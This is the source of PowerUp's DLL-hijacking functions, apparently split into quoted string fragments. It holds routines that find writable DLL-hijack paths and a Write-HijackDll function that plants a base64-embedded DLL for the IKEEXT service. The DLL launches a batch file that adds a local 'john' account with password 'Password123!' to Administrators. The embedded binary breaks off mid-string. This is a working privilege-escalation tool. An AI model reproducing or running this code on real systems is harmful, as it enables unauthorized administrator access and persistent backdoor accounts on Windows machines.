Finds possibl','e hijackable D','LL locations f','or all process','es.

.EXAMPLE
','
Get-Process V','ulnProcess | F','ind-ProcessDLL','Hijack

Finds ','possible hijac','kable DLL loca','tions for the ','''VulnProcess'' ','processes.

.E','XAMPLE

Find-P','rocessDLLHijac','k -ExcludeWind','ows -ExcludePr','ogramFiles

Fi','nds possible h','ijackable DLL ','locations not ','in C:\Windows\','* and
not in C',':\Program File','s\* or C:\Prog','ram Files (x86',')\*

.EXAMPLE
','
Find-ProcessD','LLHijack -Excl','udeOwned

Find','s possible hij','ackable DLL lo','cation for pro','cesses not own','ed by the
curr','ent user.

.OU','TPUTS

PowerUp','.HijackableDLL','.Process

.LIN','K

https://www','.mandiant.com/','blog/malware-p','ersistence-win','dows-registry/','
#>

    [Diag','nostics.CodeAn','alysis.Suppres','sMessageAttrib','ute(''PSShouldP','rocess'', '''')]
','    [OutputTyp','e(''PowerUp.Hij','ackableDLL.Pro','cess'')]
    [C','mdletBinding()',']
    Param(
 ','       [Parame','ter(Position =',' 0, ValueFromP','ipeline = $Tru','e, ValueFromPi','pelineByProper','tyName = $True',')]
        [Al','ias(''ProcessNa','me'')]
        ','[String[]]
   ','     $Name = $','(Get-Process |',' Select-Object',' -Expand Name)',',

        [Sw','itch]
        ','$ExcludeWindow','s,

        [S','witch]
       ',' $ExcludeProgr','amFiles,

    ','    [Switch]
 ','       $Exclud','eOwned
    )

','    BEGIN {
  ','      # the kn','own DLL cache ','to exclude fro','m our findings','
        #   h','ttp://blogs.ms','dn.com/b/larry','osterman/archi','ve/2004/07/19/','187752.aspx
  ','      $Keys = ','(Get-Item "HKL','M:\System\Curr','entControlSet\','Control\Sessio','n Manager\Know','nDLLs")
      ','  $KnownDLLs =',' $(ForEach ($K','eyName in $Key','s.GetValueName','s()) { $Keys.G','etValue($KeyNa','me).tolower() ','}) | Where-Obj','ect { $_.EndsW','ith(".dll") }
','        $Known','DLLPaths = $(F','orEach ($name ','in $Keys.GetVa','lueNames()) { ','$Keys.GetValue','($name).tolowe','r() }) | Where','-Object { -not',' $_.EndsWith("','.dll") }
     ','   $KnownDLLs ','+= ForEach ($p','ath in $KnownD','LLPaths) { ls ','-force $path\*','.dll | Select-','Object -Expand','Property Name ','| ForEach-Obje','ct { $_.tolowe','r() }}
       ',' $CurrentUser ','= [System.Secu','rity.Principal','.WindowsIdenti','ty]::GetCurren','t().Name

    ','    # get the ','owners for all',' processes
   ','     $Owners =',' @{}
        G','et-WmiObject -','Class win32_pr','ocess | Where-','Object {$_} | ','ForEach-Object',' { $Owners[$_.','handle] = $_.g','etowner().user',' }
    }

    ','PROCESS {

   ','     ForEach (','$ProcessName i','n $Name) {

  ','          $Tar','getProcess = G','et-Process -Na','me $ProcessNam','e

           ',' if ($TargetPr','ocess -and $Ta','rgetProcess.Pa','th -and ($Targ','etProcess.Path',' -ne '''') -and ','($Null -ne $Ta','rgetProcess.Pa','th)) {

      ','          try ','{
            ','        $BaseP','ath = $TargetP','rocess.Path | ','Split-Path -Pa','rent
         ','           $Lo','adedModules = ','$TargetProcess','.Modules
     ','              ',' $ProcessOwner',' = $Owners[$Ta','rgetProcess.Id','.ToString()]

','              ','      ForEach ','($Module in $L','oadedModules){','

            ','            $M','odulePath = "$','BasePath\$($Mo','dule.ModuleNam','e)"

         ','              ',' # if the modu','le path doesn''','t exist in the',' process base ','path folder
  ','              ','        if ((-','not $ModulePat','h.Contains(''C:','\Windows\Syste','m32'')) -and (-','not (Test-Path',' -Path $Module','Path)) -and ($','KnownDLLs -Not','Contains $Modu','le.ModuleName)',') {

         ','              ','     $Exclude ','= $False

    ','              ','          if (','$PSBoundParame','ters[''ExcludeW','indows''] -and ','$ModulePath.Co','ntains(''C:\Win','dows'')) {
    ','              ','              ','$Exclude = $Tr','ue
           ','              ','   }

        ','              ','      if ($PSB','oundParameters','[''ExcludeProgr','amFiles''] -and',' $ModulePath.C','ontains(''C:\Pr','ogram Files''))',' {
           ','              ','       $Exclud','e = $True
    ','              ','          }

 ','              ','             i','f ($PSBoundPar','ameters[''Exclu','deOwned''] -and',' $CurrentUser.','Contains($Proc','essOwner)) {
 ','              ','              ','   $Exclude = ','$True
        ','              ','      }

     ','              ','         # out','put the proces','s name and hij','ackable path i','f exclusion wa','sn''t marked
  ','              ','            if',' (-not $Exclud','e){
          ','              ','        $Out =',' New-Object PS','Object
       ','              ','           $Ou','t | Add-Member',' Noteproperty ','''ProcessName'' ','$TargetProcess','.ProcessName
 ','              ','              ','   $Out | Add-','Member Notepro','perty ''Process','Path'' $TargetP','rocess.Path
  ','              ','              ','  $Out | Add-M','ember Noteprop','erty ''ProcessO','wner'' $Process','Owner
        ','              ','          $Out',' | Add-Member ','Noteproperty ''','ProcessHijacka','bleDLL'' $Modul','ePath
        ','              ','          $Out','.PSObject.Type','Names.Insert(0',', ''PowerUp.Hij','ackableDLL.Pro','cess'')
       ','              ','           $Ou','t
            ','              ','  }
          ','              ','}
            ','        }
    ','            }
','              ','  catch {
    ','              ','  Write-Verbos','e "Error: $_"
','              ','  }
          ','  }
        }
','    }
}


func','tion Find-Path','DLLHijack {
<#','
.SYNOPSIS

Fi','nds all direct','ories in the s','ystem %PATH% t','hat are modifi','able by the cu','rrent user.

A','uthor: Will Sc','hroeder (@harm','j0y)  
License',': BSD 3-Clause','  
Required De','pendencies: Ge','t-ModifiablePa','th  

.DESCRIP','TION

Enumerat','es the paths s','tored in Env:P','ath (%PATH) an','d filters each',' through Get-M','odifiablePath
','to return the ','folder paths t','he current use','r can write to','. On Windows 7',', if wlbsctrl.','dll is
written',' to one of the','se paths, exec','ution for the ','IKEEXT can be ','hijacked due t','o DLL search
o','rder loading.
','
.EXAMPLE

Fin','d-PathDLLHijac','k

Finds all %','PATH% .DLL hij','acking opportu','nities.

.OUTP','UTS

PowerUp.H','ijackableDLL.P','ath

.LINK

ht','tp://www.greyh','athacker.net/?','p=738
#>

    ','[Diagnostics.C','odeAnalysis.Su','ppressMessageA','ttribute(''PSSh','ouldProcess'', ',''''')]
    [Outp','utType(''PowerU','p.HijackableDL','L.Path'')]
    ','[CmdletBinding','()]
    Param(',')

    # use -','Literal so the',' spaces in %PA','TH% folders ar','e not tokenize','d
    Get-Item',' Env:Path | Se','lect-Object -E','xpandProperty ','Value | ForEac','h-Object { $_.','split('';'') } |',' Where-Object ','{$_ -and ($_ -','ne '''')} | ForE','ach-Object {
 ','       $Target','Path = $_
    ','    $Modifidab','lePaths = $Tar','getPath | Get-','ModifiablePath',' -Literal | Wh','ere-Object {$_',' -and ($Null -','ne $_) -and ($','Null -ne $_.Mo','difiablePath) ','-and ($_.Modif','iablePath.Trim','() -ne '''')}
  ','      ForEach ','($ModifidableP','ath in $Modifi','dablePaths) {
','            if',' ($Null -ne $M','odifidablePath','.ModifiablePat','h) {
         ','       $Modifi','dablePath | Ad','d-Member Notep','roperty ''%PATH','%'' $_
        ','        $Modif','idablePath | A','dd-Member Alia','sproperty Name',' ''%PATH%''
    ','            $M','odifidablePath','.PSObject.Type','Names.Insert(0',', ''PowerUp.Hij','ackableDLL.Pat','h'')
          ','      $Modifid','ablePath
     ','       }
     ','   }
    }
}

','
function Writ','e-HijackDll {
','<#
.SYNOPSIS

','Patches in the',' path to a spe','cified .bat (c','ontaining the ','specified comm','and) into a
pr','e-compiled hij','ackable C++ DL','L writes the D','LL out to the ','specified Serv','icePath locati','on.

Author: W','ill Schroeder ','(@harmj0y)  
L','icense: BSD 3-','Clause  
Requi','red Dependenci','es: None  

.D','ESCRIPTION

Fi','rst builds a s','elf-deleting .','bat file that ','executes the s','pecified -Comm','and or local u','ser,
to add an','d writes the.b','at out to -Bat','Path. The BatP','ath is then pa','tched into a p','re-compiled
C+','+ DLL that is ','built to be hi','jackable by th','e IKEEXT servi','ce. There are ','two DLLs, one ','for
x86 and on','e for x64, and',' both are cont','ained as base6','4-encoded stri','ngs. The DLL i','s then
written',' out to the sp','ecified Output','File.

.PARAME','TER DllPath

F','ile name to wr','ite the genera','ted DLL out to','.

.PARAMETER ','Architecture

','The Architectu','re to generate',' for the DLL, ','x86 or x64. If',' not specified',', PowerUp
will',' try to automa','tically determ','ine the correc','t architecture','.

.PARAMETER ','BatPath

Path ','to the .bat fo','r the DLL to l','aunch.

.PARAM','ETER UserName
','
The [domain\]','username to ad','d. If not give','n, it defaults',' to "john".
Do','main users are',' not created, ','only added to ','the specified ','localgroup.

.','PARAMETER Pass','word

The pass','word to set fo','r the added us','er. If not giv','en, it default','s to "Password','123!"

.PARAME','TER LocalGroup','

Local group ','name to add th','e user to (def','ault of ''Admin','istrators'').

','.PARAMETER Cre','dential

A [Ma','nagement.Autom','ation.PSCreden','tial] object s','pecifying the ','user/password ','to add.

.PARA','METER Command
','
Custom comman','d to execute i','nstead of user',' creation.

.O','UTPUTS

PowerU','p.HijackableDL','L
#>

    [Dia','gnostics.CodeA','nalysis.Suppre','ssMessageAttri','bute(''PSShould','Process'', '''')]','
    [Diagnost','ics.CodeAnalys','is.SuppressMes','sageAttribute(','''PSAvoidUsingU','serNameAndPass','WordParams'', ''',''')]
    [Diagn','ostics.CodeAna','lysis.Suppress','MessageAttribu','te(''PSAvoidUsi','ngPlainTextFor','Password'', '''')',']
    [OutputT','ype(''PowerUp.H','ijackableDLL'')',']
    [CmdletB','inding()]
    ','Param(
       ',' [Parameter(Ma','ndatory = $Tru','e)]
        [S','tring]
       ',' [ValidateNotN','ullOrEmpty()]
','        $DllPa','th,

        [','String]
      ','  [ValidateSet','(''x86'', ''x64'')',']
        $Arc','hitecture,

  ','      [String]','
        [Vali','dateNotNullOrE','mpty()]
      ','  $BatPath,

 ','       [String',']
        $Use','rName = ''john''',',

        [St','ring]
        ','$Password = ''P','assword123!'',
','
        [Stri','ng]
        $L','ocalGroup = ''A','dministrators''',',

        [Ma','nagement.Autom','ation.PSCreden','tial]
        ','[Management.Au','tomation.Crede','ntialAttribute','()]
        $C','redential = [M','anagement.Auto','mation.PSCrede','ntial]::Empty,','

        [Str','ing]
        [','ValidateNotNul','lOrEmpty()]
  ','      $Command','
    )

    fu','nction local:I','nvoke-PatchDll',' {
    <#
    ','.SYNOPSIS

   ',' Helpers that ','patches a stri','ng in a binary',' byte array.

','    .PARAMETER',' DllBytes

   ',' The binary bl','ob to patch.

','    .PARAMETER',' SearchString
','
    The strin','g to replace i','n the blob.

 ','   .PARAMETER ','ReplaceString
','
    The strin','g to replace S','earchString wi','th.
    #>

  ','      [OutputT','ype(''System.By','te[]'')]
      ','  [CmdletBindi','ng()]
        ','Param(
       ','     [Paramete','r(Mandatory = ','$True)]
      ','      [Byte[]]','
            $','DllBytes,

   ','         [Para','meter(Mandator','y = $True)]
  ','          [Str','ing]
         ','   $SearchStri','ng,

         ','   [Parameter(','Mandatory = $T','rue)]
        ','    [String]
 ','           $Re','placeString
  ','      )

     ','   $ReplaceStr','ingBytes = ([S','ystem.Text.Enc','oding]::UTF8).','GetBytes($Repl','aceString)

  ','      $Index =',' 0
        $S ','= [System.Text','.Encoding]::AS','CII.GetString(','$DllBytes)
   ','     $Index = ','$S.IndexOf($Se','archString)

 ','       if ($In','dex -eq 0) {
 ','           thr','ow("Could not ','find string $S','earchString !"',')
        }

 ','       for ($i','=0; $i -lt $Re','placeStringByt','es.Length; $i+','+) {
         ','   $DllBytes[$','Index+$i]=$Rep','laceStringByte','s[$i]
        ','}

        ret','urn $DllBytes
','    }

    if ','($PSBoundParam','eters[''Command',''']) {
        ','$BatCommand = ','$Command
    }','
    else {
  ','      if ($PSB','oundParameters','[''Credential'']',') {
          ','  $UserNameToA','dd = $Credenti','al.UserName
  ','          $Pas','swordToAdd = $','Credential.Get','NetworkCredent','ial().Password','
        }
   ','     else {
  ','          $Use','rNameToAdd = $','UserName
     ','       $Passwo','rdToAdd = $Pas','sword
        ','}

        if ','($UserNameToAd','d.Contains(''\''',')) {
         ','   # only addi','ng a domain us','er to the loca','l group, no us','er creation
  ','          $Bat','Command = "net',' localgroup $L','ocalGroup $Use','rNameToAdd /ad','d"
        }
 ','       else {
','            # ','create a local',' user and add ','it to the loca','l specified gr','oup
          ','  $BatCommand ','= "net user $U','serNameToAdd $','PasswordToAdd ','/add && timeou','t /t 5 && net ','localgroup $Lo','calGroup $User','NameToAdd /add','"
        }
  ','  }

    # gen','erate with bas','e64 -w 0 hijac','k32.dll > hija','ck32.b64
    $','DllBytes32 = "','TVqQAAMAAAAEAA','AA//8AALgAAAAA','AAAAQAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAA6AAA','AA4fug4AtAnNIb','gBTM0hVGhpcyBw','cm9ncmFtIGNhbm','5vdCBiZSBydW4g','aW4gRE9TIG1vZG','UuDQ0KJAAAAAAA','AAA4hlvqfOc1uX','znNbl85zW5Z3qe','uWXnNblnequ5cu','c1uWd6n7k+5zW5','dZ+muXvnNbl85z','S5O+c1uWd6mrl/','5zW5Z3qouX3nNb','lSaWNofOc1uQAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AFBFAABMAQUANg','BCVgAAAAAAAAAA','4AACIQsBCgAATA','AAAEoAAAAAAABc','EwAAABAAAABgAA','AAAAAQABAAAAAC','AAAFAAEAAAAAAA','UAAQAAAAAAANAA','AAAEAACH7wAAAg','BAAQAAEAAAEAAA','AAAQAAAQAAAAAA','AAEAAAAAAAAAAA','AAAAHIQAAFAAAA','AAsAAAtAEAAAAA','AAAAAAAAAAAAAA','AAAAAAwAAAMAcA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAsIAAAEAAAAAA','AAAAAAAAAABgAA','AAAQAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAALnRl','eHQAAABMSwAAAB','AAAABMAAAABAAA','AAAAAAAAAAAAAA','AAIAAAYC5yZGF0','YQAABCoAAABgAA','AALAAAAFAAAAAA','AAAAAAAAAAAAAE','AAAEAuZGF0YQAA','AHwZAAAAkAAAAA','wAAAB8AAAAAAAA','AAAAAAAAAABAAA','DALnJzcmMAAAC0','AQAAALAAAAACAA','AAiAAAAAAAAAAA','AAAAAAAAQAAAQC','5yZWxvYwAArg8A','AADAAAAAEAAAAI','oAAAAAAAAAAAAA','AAAAAEAAAEIAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAFWL7IPs','IKEAkAAQM8WJRf','yNRehQaP8BDwD/','FRhgABBQ/xUIYA','AQhcB1BTPAQOtT','jUXgUGgggAAQag','D/FQRgABCFwHTm','i0XgagCJRfCLRe','RqAGoQiUX0jUXs','UGoA/3Xox0XsAQ','AAAMdF+AIAAAD/','FQBgABCFwHSz/3','Xo/xUQYAAQM8CL','TfwzzehcAAAAyc','NWizUUYAAQaPoA','AAD/1uhf////hc','B1H1BQaDiAABBo','jIAAEGiogAAQUP','8V+GAAEGjoAwAA','/9YzwF7DVYvsaA','QBAADoIgAAAItF','DEhZdQXorf///z','PAQF3CDAA7DQCQ','ABB1AvPD6YgCAA','CL/1WL7F3p0gMA','AGoIaACCABDo8h','MAAItFDIP4AXV6','6KYTAACFwHUHM8','DpOAEAAOiQBwAA','hcB1B+irEwAA6+','noOhMAAP8VJGAA','EKN4qQAQ6JMSAA','CjhJsAEOjADAAA','hcB5B+g8BAAA68','/ovhEAAIXAeCDo','Pw8AAIXAeBdqAO','iCCgAAWYXAdQv/','BYCbABDp0gAAAO','jMDgAA68kz/zvH','dVs5PYCbABB+gf','8NgJsAEIl9/Dk9','DJ8AEHUF6DQMAA','A5fRB1D+icDgAA','6NcDAADoFxMAAM','dF/P7////oBwAA','AOmCAAAAM/85fR','B1DoM9QJAAEP90','BeisAwAAw+tqg/','gCdVnoawMAAGgU','AgAAagHorggAAF','lZi/A79w+EDP//','/1b/NUCQABD/Nd','SeABD/FSBgABD/','0IXAdBdXVuikAw','AAWVn/FRxgABCJ','BoNOBP/rGFbo7Q','cAAFnp0P7//4P4','A3UHV+jzBQAAWT','PAQOjiEgAAwgwA','agxoIIIAEOiOEg','AAi/mL8otdCDPA','QIlF5IX2dQw5FY','CbABAPhMUAAACD','ZfwAO/B0BYP+An','UuoTBhABCFwHQI','V1ZT/9CJReSDfe','QAD4SWAAAAV1ZT','6EP+//+JReSFwA','+EgwAAAFdWU+j2','/f//iUXkg/4BdS','SFwHUgV1BT6OL9','//9XagBT6BP+//','+hMGEAEIXAdAZX','agBT/9CF9nQFg/','4DdSZXVlPo8/3/','/4XAdQMhReSDfe','QAdBGhMGEAEIXA','dAhXVlP/0IlF5M','dF/P7///+LReTr','HYtF7IsIiwlQUe','jyFAAAWVnDi2Xo','x0X8/v///zPA6O','oRAADDi/9Vi+yD','fQwBdQXo7RQAAP','91CItNEItVDOjs','/v//WV3CDACL/1','WL7IHsKAMAAKOg','nAAQiQ2cnAAQiR','WYnAAQiR2UnAAQ','iTWQnAAQiT2MnA','AQZowVuJwAEGaM','DaycABBmjB2InA','AQZowFhJwAEGaM','JYCcABBmjC18nA','AQnI8FsJwAEItF','AKOknAAQi0UEo6','icABCNRQijtJwA','EIuF4Pz//8cF8J','sAEAEAAQChqJwA','EKOkmwAQxwWYmw','AQCQQAwMcFnJsA','EAEAAAChAJAAEI','mF2Pz//6EEkAAQ','iYXc/P///xU0YA','AQo+ibABBqAeio','FAAAWWoA/xUwYA','AQaDRhABD/FSxg','ABCDPeibABAAdQ','hqAeiEFAAAWWgJ','BADA/xUYYAAQUP','8VKGAAEMnDxwFA','YQAQ6SkVAACL/1','WL7FaL8ccGQGEA','EOgWFQAA9kUIAX','QHVuiSFQAAWYvG','Xl3CBACL/1WL7F','b/dQiL8egkFQAA','xwZAYQAQi8ZeXc','IEAIv/VYvsg+wQ','6w3/dQjoQxcAAF','mFwHQP/3UI6JMW','AABZhcB05snD9g','XIngAQAb+8ngAQ','vkBhABB1LIMNyJ','4AEAFqAY1F/FCL','z8dF/EhhABDo1B','MAAGg4WwAQiTW8','ngAQ6DcWAABZV4','1N8OipFAAAaDyC','ABCNRfBQiXXw6P','4WAADMagD/FThg','ABDD/xU8YAAQwg','QAi/9W/zVEkAAQ','/xVAYAAQi/CF9n','Ub/zXQngAQ/xUg','YAAQi/BW/zVEkA','AQ/xVEYAAQi8Ze','w6FAkAAQg/j/dB','ZQ/zXYngAQ/xUg','YAAQ/9CDDUCQAB','D/oUSQABCD+P90','DlD/FUhgABCDDU','SQABD/6RAXAABq','CGiQggAQ6B0PAA','BoWGEAEP8VUGAA','EIt1CMdGXMhhAB','CDZggAM/9HiX4U','iX5wxobIAAAAQ8','aGSwEAAEPHRmgY','lAAQag3o9hcAAF','mDZfwA/3Zo/xVM','YAAQx0X8/v///+','g+AAAAagzo1RcA','AFmJffyLRQyJRm','yFwHUIoRCUABCJ','Rmz/dmzo6hcAAF','nHRfz+////6BUA','AADo0w4AAMMz/0','eLdQhqDei+FgAA','WcNqDOi1FgAAWc','OL/1ZX/xVYYAAQ','/zVAkAAQi/joxP','7////Qi/CF9nVO','aBQCAABqAej/Aw','AAi/BZWYX2dDpW','/zVAkAAQ/zXUng','AQ/xUgYAAQ/9CF','wHQYagBW6Pj+//','9ZWf8VHGAAEINO','BP+JBusJVuhBAw','AAWTP2V/8VVGAA','EF+Lxl7Di/9W6H','////+L8IX2dQhq','EOjeBgAAWYvGXs','NqCGi4ggAQ6NYN','AACLdQiF9g+E+A','AAAItGJIXAdAdQ','6PQCAABZi0Yshc','B0B1Do5gIAAFmL','RjSFwHQHUOjYAg','AAWYtGPIXAdAdQ','6MoCAABZi0ZAhc','B0B1DovAIAAFmL','RkSFwHQHUOiuAg','AAWYtGSIXAdAdQ','6KACAABZi0ZcPc','hhABB0B1DojwIA','AFlqDehoFgAAWY','Nl/ACLfmiF/3Qa','V/8VXGAAEIXAdQ','+B/xiUABB0B1fo','YgIAAFnHRfz+//','//6FcAAABqDOgv','FgAAWcdF/AEAAA','CLfmyF/3QjV+jc','FgAAWTs9EJQAEH','QUgf84kwAQdAyD','PwB1B1foWRcAAF','nHRfz+////6B4A','AABW6AoCAABZ6B','MNAADCBACLdQhq','Dej/FAAAWcOLdQ','hqDOjzFAAAWcOL','/1WL7IM9QJAAEP','90S4N9CAB1J1b/','NUSQABCLNUBgAB','D/1oXAdBP/NUCQ','ABD/NUSQABD/1v','/QiUUIXmoA/zVA','kAAQ/zXUngAQ/x','UgYAAQ/9D/dQjo','eP7//6FEkAAQg/','j/dAlqAFD/FURg','ABBdw4v/V2hYYQ','AQ/xVQYAAQi/iF','/3UJ6Mb8//8zwF','/DVos1YGAAEGiU','YQAQV//WaIhhAB','BXo8yeABD/1mh8','YQAQV6PQngAQ/9','ZodGEAEFej1J4A','EP/Wgz3MngAQAI','s1RGAAEKPYngAQ','dBaDPdCeABAAdA','2DPdSeABAAdASF','wHUkoUBgABCj0J','4AEKFIYAAQxwXM','ngAQXRUAEIk11J','4AEKPYngAQ/xU8','YAAQo0SQABCD+P','8PhMEAAAD/NdCe','ABBQ/9aFwA+EsA','AAAOgeAgAA/zXM','ngAQizU4YAAQ/9','b/NdCeABCjzJ4A','EP/W/zXUngAQo9','CeABD/1v812J4A','EKPUngAQ/9aj2J','4AEOjYEgAAhcB0','Y4s9IGAAEGgeFw','AQ/zXMngAQ/9f/','0KNAkAAQg/j/dE','RoFAIAAGoB6MEA','AACL8FlZhfZ0MF','b/NUCQABD/NdSe','ABD/1//QhcB0G2','oAVui++///WVn/','FRxgABCDTgT/iQ','YzwEDrB+hp+///','M8BeX8OL/1WL7I','N9CAB0Lf91CGoA','/zUgoAAQ/xVkYA','AQhcB1GFbo1B4A','AIvw/xVYYAAQUO','iEHgAAWYkGXl3D','i/9Vi+xWVzP2/3','UI6AURAACL+FmF','/3UnOQXcngAQdh','9W/xUUYAAQjYbo','AwAAOwXcngAQdg','ODyP+L8IP4/3XK','i8dfXl3Di/9Vi+','xWVzP2agD/dQz/','dQjoeB4AAIv4g8','QMhf91JzkF3J4A','EHYfVv8VFGAAEI','2G6AMAADsF3J4A','EHYDg8j/i/CD+P','91w4vHX15dw4v/','VYvsVlcz9v91DP','91COiwHgAAi/hZ','WYX/dSw5RQx0Jz','kF3J4AEHYfVv8V','FGAAEI2G6AMAAD','sF3J4AEHYDg8j/','i/CD+P91wYvHX1','5dw4v/VYvsaLBh','ABD/FVBgABCFwH','QVaKBhABBQ/xVg','YAAQhcB0Bf91CP','/QXcOL/1WL7P91','COjI////Wf91CP','8VaGAAEMxqCOh+','EgAAWcNqCOicEQ','AAWcOL/1boqPn/','/4vwVuhmEAAAVu','glIQAAVugQIQAA','Vuj7IAAAVujwHg','AAVujZHgAAg8QY','XsOL/1WL7FaLdQ','gzwOsPhcB1EIsO','hcl0Av/Rg8YEO3','UMcuxeXcOL/1WL','7IM9cKkAEAB0GW','hwqQAQ6B0jAABZ','hcB0Cv91CP8VcK','kAEFnoUiIAAGgY','YQAQaAhhABDoof','///1lZhcB1VFZX','aJskABDoJw8AAL','gAYQAQvgRhABBZ','i/g7xnMPiweFwH','QC/9CDxwQ7/nLx','gz10qQAQAF9edB','todKkAEOizIgAA','WYXAdAxqAGoCag','D/FXSpABAzwF3D','aiBo4IIAEOhiCA','AAagjochEAAFmD','ZfwAM8BAOQUQnw','AQD4TYAAAAowyf','ABCKRRCiCJ8AEI','N9DAAPhaAAAAD/','NWipABCLNSBgAB','D/1ovYiV3Qhdt0','aP81ZKkAEP/Wi/','iJfdSJXdyJfdiD','7wSJfdQ7+3JL6E','v4//85B3TtO/ty','Pv83/9aL2Og4+P','//iQf/0/81aKkA','EP/Wi9j/NWSpAB','D/1jld3HUFOUXY','dA6JXdyJXdCJRd','iL+Il91Itd0Our','x0XkHGEAEIF95C','BhABBzEYtF5IsA','hcB0Av/Qg0XkBO','vmx0XgJGEAEIF9','4ChhABBzEYtF4I','sAhcB0Av/Qg0Xg','BOvmx0X8/v///+','ggAAAAg30QAHUp','xwUQnwAQAQAAAG','oI6IoPAABZ/3UI','6L39//+DfRAAdA','hqCOh0DwAAWcPo','dAcAAMOL/1WL7G','oAagH/dQjor/7/','/4PEDF3DagFqAG','oA6J/+//+DxAzD','i/9Vi+zowCMAAP','91COgJIgAAWWj/','AAAA6L7////Mi/','9Vi+yD7ExWjUW0','UP8VfGAAEGpAai','BeVuiC/P//WVkz','yTvBdQiDyP/pDw','IAAI2QAAgAAKNg','qAAQiTVYqAAQO8','JzNoPABYNI+/9m','x0D/AAqJSANmx0','AfAArGQCEKiUgz','iEgvizVgqAAQg8','BAjVD7gcYACAAA','O9ZyzVNXZjlN5g','+EDgEAAItF6DvB','D4QDAQAAixiDwA','SJRfwDw74ACAAA','iUX4O958AoveOR','1YqAAQfWu/ZKgA','EGpAaiDo4vv//1','lZhcB0UYMFWKgA','ECCNiAAIAACJBz','vBczGDwAWDSPv/','g2ADAIBgH4CDYD','MAZsdA/wAKZsdA','IAoKxkAvAIsPg8','BAA86NUPs70XLS','g8cEOR1YqAAQfK','LrBosdWKgAEDP/','hdt+cotF+IsAg/','j/dFyD+P50V4tN','/IoJ9sEBdE32wQ','h1C1D/FXhgABCF','wHQ9i/eD5h+Lx8','H4BcHmBgM0hWCo','ABCLRfiLAIkGi0','X8igCIRgRooA8A','AI1GDFD/FXRgAB','CFwA+EvAAAAP9G','CINF+ARH/0X8O/','t8jjPbi/PB5gYD','NWCoABCLBoP4/3','QLg/j+dAaATgSA','63HGRgSBhdt1BW','r2WOsKjUP/99gb','wIPA9VD/FXBgAB','CL+IP//3RChf90','Plf/FXhgABCFwH','QzJf8AAACJPoP4','AnUGgE4EQOsJg/','gDdQSATgQIaKAP','AACNRgxQ/xV0YA','AQhcB0LP9GCOsK','gE4EQMcG/v///0','OD+wMPjGj/////','NVioABD/FWxgAB','AzwF9bXsnDg8j/','6/aL/1ZXv2CoAB','CLB4XAdDaNiAAI','AAA7wXMhjXAMg3','78AHQHVv8VgGAA','EIsHg8ZABQAIAA','CNTvQ7yHLi/zfo','m/n//4MnAFmDxw','SB/2CpABB8uV9e','w4M9bKkAEAB1Be','gVGAAAVos1hJsA','EFcz/4X2dRiDyP','/pkQAAADw9dAFH','VuiEIQAAWY10Bg','GKBoTAdepqBEdX','6MX5//+L+FlZiT','3wngAQhf90y4s1','hJsAEFPrM1boUy','EAAIA+PVmNWAF0','ImoBU+iX+f//WV','mJB4XAdD9WU1Do','zCAAAIPEDIXAdU','eDxwQD84A+AHXI','/zWEmwAQ6Oz4//','+DJYSbABAAgycA','xwVgqQAQAQAAAD','PAWVtfXsP/NfCe','ABDoxvj//4Ml8J','4AEACDyP/r5DPA','UFBQUFDojxwAAM','yL/1WL7FGLTRBT','M8BWiQeL8otVDM','cBAQAAADlFCHQJ','i10Ig0UIBIkTiU','X8gD4idRAzwDlF','/LMiD5TARolF/O','s8/weF0nQIigaI','AkKJVQyKHg+2w1','BG6FshAABZhcB0','E/8Hg30MAHQKi0','0Migb/RQyIAUaL','VQyLTRCE23Qyg3','38AHWpgPsgdAWA','+wl1n4XSdATGQv','8Ag2X8AIA+AA+E','6QAAAIoGPCB0BD','wJdQZG6/NO6+OA','PgAPhNAAAACDfQ','gAdAmLRQiDRQgE','iRD/ATPbQzPJ6w','JGQYA+XHT5gD4i','dSb2wQF1H4N9/A','B0DI1GAYA4InUE','i/DrDTPAM9s5Rf','wPlMCJRfzR6YXJ','dBJJhdJ0BMYCXE','L/B4XJdfGJVQyK','BoTAdFWDffwAdQ','g8IHRLPAl0R4Xb','dD0PvsBQhdJ0I+','h2IAAAWYXAdA2K','BotNDP9FDIgBRv','8Hi00Migb/RQyI','AesN6FMgAABZhc','B0A0b/B/8Hi1UM','RulW////hdJ0B8','YCAEKJVQz/B4tN','EOkO////i0UIXl','uFwHQDgyAA/wHJ','w4v/VYvsg+wMUz','PbVlc5HWypABB1','BeiTFQAAaAQBAA','C+GJ8AEFZTiB0c','oAAQ/xWEYAAQoX','ipABCJNQCfABA7','w3QHiUX8OBh1A4','l1/ItV/I1F+FBT','U4199OgK/v//i0','X4g8QMPf///z9z','SotN9IP5/3NCi/','jB5wKNBA87wXI2','UOjK9v//i/BZO/','N0KYtV/I1F+FAD','/ldWjX306Mn9//','+LRfiDxAxIo+Se','ABCJNeieABAzwO','sDg8j/X15bycOL','/1WL7IPsDFNW/x','WQYAAQi9gz9jve','dQQzwOt3ZjkzdB','CDwAJmOTB1+IPA','AmY5MHXwV4s9jG','AAEFZWVivDVtH4','QFBTVlaJRfT/14','lF+DvGdDhQ6Dv2','//9ZiUX8O8Z0Kl','ZW/3X4UP919FNW','Vv/XhcB1DP91/O','jf9f//WYl1/FP/','FYhgABCLRfzrCV','P/FYhgABAzwF9e','W8nDi/9WuPCBAB','C+8IEAEFeL+DvG','cw+LB4XAdAL/0I','PHBDv+cvFfXsOL','/1a4+IEAEL74gQ','AQV4v4O8ZzD4sH',